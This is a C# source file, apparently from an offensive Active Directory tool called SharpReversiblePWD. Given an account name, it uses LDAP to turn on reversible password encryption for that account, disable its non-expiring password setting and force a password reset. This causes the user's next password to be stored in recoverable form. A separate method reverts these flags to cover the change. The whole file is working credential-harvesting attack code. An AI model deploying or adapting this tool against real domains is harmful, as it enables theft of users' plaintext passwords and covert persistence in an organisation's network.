/* ==============================================================================
 * Author：RcoIl
 * Creation date：2019/12/31 16:56:26

 * Blog: https://rcoil.me
 * ==============================================================================*/

using System;
using System.Collections.Generic;
using System.Data;
using System.DirectoryServices;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SharpReversiblePWD
{
    class AccountContril
    {

        private static string defaultNamingContext(string SamAccountName)
        {
            string strContext = null;
            using (var container = new DirectoryEntry("LDAP://RootDSE"))
            {
                strContext = "CN="+ SamAccountName +",CN=Users,"+ container.Properties["defaultNamingContext"].Value.ToString();
                // CN=RcoIl,CN=Users,DC=rcoil,DC=me
            }
            return strContext;
        }

        public static void UpdateUsers(string SamAccountName)
        {
            Console.WriteLine("  [+] Query options...");
            using (DirectoryEntry user = new DirectoryEntry("LDAP://" + defaultNamingContext(SamAccountName)))
            {
                try
                {
                    int val = (int)user.Properties["userAccountControl"].Value;
                    if ((val & 0x10000) == 0x10000)
                    {
                        Console.WriteLine("    [>] Password never expires：Never");
                        Console.WriteLine("    [>] Starting Password expires...");
                        user.Properties["userAccountControl"].Value = val & ~0x10000;
                        user.CommitChanges();
                        Console.WriteLine("    [>] Password expires starten");
                    }
                    else
                    {
                        Console.WriteLine("    [>] Password expires ：Yes");
                    }

                    int valRev = (int)user.Properties["userAccountControl"].Value;
                    if ((valRev & 0x80) == 0x80)
                    {
                        Console.WriteLine("    [>] Reversible Encryption state：TURE");
                    }
                    else
                    {
                        Console.WriteLine("    [>] Reversible Encryption state：FALSE");
                        Console.WriteLine("    [>] Starting Reversible Encryption...");

                        user.Properties["userAccountControl"].Value = valRev | 0x80;
                        user.CommitChanges();

                        Console.WriteLine("    [>] Reversible Encryption Starten");
                    }
                    user.Properties["pwdLastSet"].Value = 0;
                    user.CommitChanges();
                }
                catch (Exception e)
                {
                    Console.WriteLine("  [+] Exception: {0}", e.Message);
                }
            }
        }

        public static void RepairUsers(string SamAccountName)
        {
            using (DirectoryEntry user = new DirectoryEntry("LDAP://" + defaultNamingContext(SamAccountName)))
            {
                int valRev = (int)user.Properties["userAccountControl"].Value;
                user.Properties["userAccountControl"].Value = valRev & ~0x80;
                user.Properties["pwdLastSet"].Value = -1;
                
                user.CommitChanges();

                int val = (int)user.Properties["userAccountControl"].Value;
                user.Properties["userAccountControl"].Value = val | 0x10000;
                user.CommitChanges();

                Console.WriteLine("    [>] Reversible Encryption Repair");
            }
        }
    }
}
